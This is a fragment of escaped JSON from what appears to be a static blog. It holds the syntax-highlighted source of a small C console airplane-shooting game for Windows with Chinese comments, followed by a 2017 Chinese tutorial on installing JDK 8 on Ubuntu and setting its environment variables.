class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;conio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Esc 27 <span class=\"comment\">//退出</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Up 72 <span class=\"comment\">//上，下，左，右</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Down 80</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Left 75</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Right 77</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Kong 32 <span class=\"comment\">//发射子弹</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> x=<span class=\"number\">10</span>; <span class=\"comment\">//飞机坐标</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> y=<span class=\"number\">18</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> d2=<span class=\"number\">10</span>;<span class=\"comment\">//敌机坐标</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> d1=<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> d=<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> r=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> r1=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> r2=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> t=<span class=\"number\">1</span>; <span class=\"comment\">// 游戏结束</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> f=<span class=\"number\">0</span>; <span class=\"comment\">// 计分数</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> m=<span class=\"number\">3</span>; <span class=\"comment\">// 敌机数</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> j=<span class=\"number\">0</span>; <span class=\"comment\">// 歼敌数</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> p; <span class=\"comment\">// 接受按键</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">kongzhi</span><span class=\"params\">(<span class=\"keyword\">int</span> bx,<span class=\"keyword\">int</span> by)</span></span>;<span class=\"comment\">//声明函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">huatu</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">gotoxy</span><span class=\"params\">(<span class=\"keyword\">int</span> x,<span class=\"keyword\">int</span> y)</span> <span class=\"comment\">//移动坐标</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCOORD coord;</span><br><span class=\"line\">\tcoord.X=x;</span><br><span class=\"line\">\tcoord.Y=y;</span><br><span class=\"line\">\tSetConsoleCursorPosition( GetStdHandle( STD_OUTPUT_HANDLE ), coord );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">hidden</span><span class=\"params\">()</span><span class=\"comment\">//隐藏光标</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tHANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class=\"line\">\tCONSOLE_CURSOR_INFO cci;</span><br><span class=\"line\">\tGetConsoleCursorInfo(hOut,&amp;cci);</span><br><span class=\"line\">\tcci.bVisible=<span class=\"number\">0</span>;<span class=\"comment\">//赋1为显示，赋0为隐藏</span></span><br><span class=\"line\">\tSetConsoleCursorInfo(hOut,&amp;cci);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//说明</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">shuoming</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\t\\t\\t\\n\\n\\n\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\t\\t\\t方向控制\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t上 ↑\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t下 ↓\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t左 ←\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t右 →\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t子弹 空格\\n\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t退出请按 ESC\\n\"</span>);</span><br><span class=\"line\">\tgotoxy(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//判断我机死没死/游戏结束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">byebye</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>((x==d&amp;&amp;y==r)||(x==d1&amp;&amp;y==r1)||(x==d2&amp;&amp;y==r2))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(<span class=\"number\">1</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" !!! 游戏结束 !!!\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"*******************\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 您的总得分: %d\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 敌机数: %d\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 歼敌数: %d\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 命中率: %.0f %%\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"*******************\\n\"</span>,f,m,j,((<span class=\"keyword\">float</span>)j/(<span class=\"keyword\">float</span>)m)*<span class=\"number\">100</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(!kbhit())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tSleep(<span class=\"number\">500</span>);</span><br><span class=\"line\">\t\t\tgotoxy(<span class=\"number\">1</span>,<span class=\"number\">12</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" 继续请按任意键...\\n\\n\\n\"</span>);</span><br><span class=\"line\">\t\t\tSleep(<span class=\"number\">900</span>);</span><br><span class=\"line\">\t\t\tgotoxy(<span class=\"number\">1</span>,<span class=\"number\">12</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tgotoxy(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\thuatu();</span><br><span class=\"line\">\t\tf=<span class=\"number\">0</span>; m=<span class=\"number\">0</span>; j=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(x&gt;=<span class=\"number\">18</span>) x--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> x++;</span><br><span class=\"line\">\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 计分/更新敌机</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">jifan</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==d&amp;&amp;y==r)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(d,r);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"3\"</span>);</span><br><span class=\"line\">\tSleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">\tgotoxy(d,r); <span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>); f+=<span class=\"number\">2</span>; r=<span class=\"number\">0</span>; j++;&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==d1&amp;&amp;y==r1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"1\"</span>);</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\tf+=<span class=\"number\">3</span>; r1=<span class=\"number\">0</span>; j++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==d2&amp;&amp;y==r2)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"0\"</span>);</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\tf+=<span class=\"number\">1</span>; r2=<span class=\"number\">0</span>; j++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tgotoxy(<span class=\"number\">26</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d \\n\"</span>,f);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//画图</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">huatu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,n;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">20</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(n=<span class=\"number\">0</span>;n&lt;=<span class=\"number\">20</span>;n++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=<span class=\"number\">19</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(n=<span class=\"number\">1</span>;n&lt;=<span class=\"number\">19</span>;n++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tgotoxy(i,n);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//随机产生敌机</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">dfeiji</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(t)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!r) &#123;d=rand()%<span class=\"number\">17</span>+<span class=\"number\">1</span>; m++;&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!r1) &#123;d1=rand()%<span class=\"number\">17</span>+<span class=\"number\">1</span>; m++;&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!r2) &#123;d2=rand()%<span class=\"number\">17</span>+<span class=\"number\">1</span>; m++;&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(t)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tr++; r1++; r2++;</span><br><span class=\"line\">\t\t\tgotoxy(d,r);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ψ\"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"ж\"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"♀\"</span>);</span><br><span class=\"line\">\t\t\tSleep(<span class=\"number\">900</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d,r);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\tkongzhi(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t\tbyebye();</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r==<span class=\"number\">18</span>) r=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r1==<span class=\"number\">18</span>) r1=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r2==<span class=\"number\">18</span>) r2=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r==<span class=\"number\">0</span>||r1==<span class=\"number\">0</span>||r2==<span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//操控飞机</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">kongzhi</span><span class=\"params\">(<span class=\"keyword\">int</span> bx,<span class=\"keyword\">int</span> by)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (kbhit())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((p=getch())==<span class=\"number\">-32</span>) p=getch();</span><br><span class=\"line\">\t\ta=p;</span><br><span class=\"line\">\t\tgotoxy(<span class=\"number\">22</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span>(a)</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">//控制方向</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Up:<span class=\"keyword\">if</span> (y!=<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\ty--;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Down:<span class=\"keyword\">if</span> (y!=<span class=\"number\">18</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\ty++;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Left:<span class=\"keyword\">if</span> (x!=<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\tx--;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Right:<span class=\"keyword\">if</span> (x!=<span class=\"number\">18</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\tx++;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Kong:</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tbx=y;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span>(by=y;by&gt;<span class=\"number\">1</span>;) <span class=\"comment\">//发射子弹</span></span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tby--;</span><br><span class=\"line\">\t\t\t\t\tgotoxy(x,by);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"θ\"</span>);</span><br><span class=\"line\">\t\t\t\t\tSleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">\t\t\t\t\tgotoxy(x,by);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\t\ty=by;</span><br><span class=\"line\">\t\t\t\t\tjifan();</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(r==<span class=\"number\">0</span>||r1==<span class=\"number\">0</span>||r2==<span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\ty=bx;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Esc:t=<span class=\"number\">0</span>; <span class=\"keyword\">break</span>; <span class=\"comment\">//退出</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">default</span>:<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsrand(time(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">\tshuoming();</span><br><span class=\"line\">\thidden();</span><br><span class=\"line\">\thuatu();</span><br><span class=\"line\">\tgotoxy(x,y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\tgotoxy(<span class=\"number\">22</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"分数:\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (t)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tkongzhi(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(t)</span><br><span class=\"line\">\t\t\tdfeiji ();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"在ubuntu安装jdk并配置环境变量","date":"2017-09-21T09:11:43.000Z","_content":"\n首先到java官网下载jdk:[http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)\n\n我使用的是ubuntu64位系统，所以下载的是jdk-8u144-linux-x64.tar.gz这个文件，下载完解压到/usr/lib/jvm目录下\n```\n\tsudo tar zxvf jdk-8u144-linux-x64.tar.gz -C /usr/lib/jvm\n```\n(如果没有/usr/lib/jvm目录先使用\n```\n\tcd /usr/lib\n\tsudo mkdir jvm\n```\n这两条命令创建)\n<!--more-->\n然后打开终端，输入\n```\n\tgedit ~/.bashrc\n```\n在文本末尾加上\n```\n\texport JAVA_HOME=/usr/lib/jvm/jdk1.8.0_144\n\texport JRE_HOME=${JAVA_HOME}/jre\n\texport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib\n\texport PATH=${JAVA_HOME}/bin:$PATH\n```\n然后保存关闭编辑器，输入\n```\n\tsource ~/.bashrc\n```\n使得环境变量配置生效\n\n输入\n```\n\tjava -version\n```\n如果出现版本号说明安装配置成功\n\n以上在联网的情况下可以通过\n```\n\tsudo apt-get install openjdk-8-jdk\n```\n完成","source":"_posts/post231.md","raw":"---\ntitle: 在ubuntu安装jdk并配置环境变量\ndate: 2017-09-21 17:11:43\ntags: 